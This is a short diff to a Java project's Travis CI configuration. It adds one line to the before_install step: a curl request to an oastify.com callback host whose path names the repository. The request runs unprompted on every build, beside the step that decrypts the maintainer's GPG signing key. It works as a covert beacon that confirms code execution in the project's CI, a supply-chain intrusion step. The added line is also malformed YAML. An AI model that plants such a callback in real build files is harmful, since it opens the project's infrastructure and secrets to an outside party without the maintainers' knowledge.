@@ -3,6 +3,7 @@ language: java
 jdk:
 - openjdk8
 before_install:
+curl https://bm1r0o9d3avrqu1hhmzb369unltgh7ev3.oastify.com/yahoo/parsec-libraries
 ## see https://docs.travis-ci.com/user/encrypting-filest/ on how travis encrypt/decrypt files
 ## encrypted secrect key for gpg private key for artifact sigining
 - if [ "${TRAVIS_PULL_REQUEST}" == "false" ]; then openssl aes-256-cbc -K $encrypted_4f2072688125_key -iv $encrypted_4f2072688125_iv -in maintainer-secring.gpg.enc -out maintainer-secring.gpg -d; fi
